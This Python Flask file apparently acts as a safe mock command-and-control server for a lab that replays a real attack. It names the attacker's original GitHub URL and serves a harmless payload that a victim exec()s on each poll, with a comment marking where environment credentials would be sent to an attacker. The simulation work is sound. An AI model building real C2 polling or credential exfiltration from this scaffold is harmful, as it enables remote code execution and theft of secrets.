"""
mock-c2/app.py — safe stand-in for the attacker's C2 infrastructure.

Endpoints replicated from the real attack:
  GET /domain.txt  — returns the C2 domain (points back to this service)
  GET /codepy      — returns a Python payload to be exec()'d on the victim

The payload delivered here is completely safe: it only writes a proof file.
"""
from flask import Flask, Response
import datetime

app = Flask(__name__)

@app.route("/domain.txt")
def domain():
    """Replaces raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt"""
    return Response("mock-c2-svc", mimetype="text/plain")

@app.route("/codepy")
def codepy():
    """Dynamic Python payload — exec()'d on the victim every poll cycle."""
    ts = datetime.datetime.utcnow().isoformat()
    payload = f"""
# Remote payload delivered at {ts}
import os, datetime
ts = datetime.datetime.utcnow().isoformat()
proof_file = '/tmp/rce_proof.txt'
with open(proof_file, 'a') as f:
    f.write(f"RCE executed at {{ts}}\\n")
    # In a real attack this is where credentials would be exfiltrated:
    # env_vars = dict(os.environ)  ->  POST to attacker server
    f.write(f"  (env vars accessible: {{len(os.environ)}} variables)\\n")
print(f"[C2] Payload executed at {{ts}}")
"""
    return Response(payload, mimetype="text/plain")

@app.route("/health")
def health():
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
